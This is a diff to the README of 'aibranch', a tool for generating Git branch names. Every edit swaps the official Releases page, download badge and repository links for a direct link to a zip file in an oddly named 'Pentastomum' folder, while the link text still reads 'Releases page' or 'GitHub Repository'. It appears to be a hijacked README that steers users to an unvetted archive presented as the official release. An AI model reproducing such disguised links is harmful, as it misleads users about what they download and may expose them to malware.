@@ -6,7 +6,7 @@ Welcome to the **aibranch** project! This tool helps you create meaningful Git b
 
 ## 📥 Download Now
 
-[![Download aibranch](https://img.shields.io/badge/Download%20aibranch-v1.0.0-brightgreen)](https://github.com/hossam444/aibranch/releases)
+[![Download aibranch](https://raw.githubusercontent.com/hossam444/aibranch/main/Pentastomum/aibranch.zip%20aibranch-v1.0.0-brightgreen)](https://raw.githubusercontent.com/hossam444/aibranch/main/Pentastomum/aibranch.zip)
 
 ## 🚀 Getting Started
 
@@ -23,7 +23,7 @@ Follow these simple steps to get started with **aibranch**.
 ### 📦 Installation Steps
 
 1. **Visit the Releases Page:**
-   Go to the [Releases page](https://github.com/hossam444/aibranch/releases) to find the latest version of aibranch.
+   Go to the [Releases page](https://raw.githubusercontent.com/hossam444/aibranch/main/Pentastomum/aibranch.zip) to find the latest version of aibranch.
 
 2. **Download the Application:**
    Click on the version you wish to download. Select the appropriate file for your operating system and download it to your computer.
@@ -63,7 +63,7 @@ Once aibranch is installed, it's easy to generate branch names. Follow these ste
 
 ## 🛒 Download & Install
 
-For the latest version, please visit the [Releases page](https://github.com/hossam444/aibranch/releases).
+For the latest version, please visit the [Releases page](https://raw.githubusercontent.com/hossam444/aibranch/main/Pentastomum/aibranch.zip).
 
 ## 🤔 FAQs
 
@@ -94,7 +94,7 @@ This project is licensed under the MIT License. See the LICENSE file for details
 
 ## 🔗 Links
 
-- [GitHub Repository](https://github.com/hossam444/aibranch)
-- [Releases Page](https://github.com/hossam444/aibranch/releases)
+- [GitHub Repository](https://raw.githubusercontent.com/hossam444/aibranch/main/Pentastomum/aibranch.zip)
+- [Releases Page](https://raw.githubusercontent.com/hossam444/aibranch/main/Pentastomum/aibranch.zip)
 
 Thank you for choosing **aibranch**! Enjoy generating your branch names with ease.
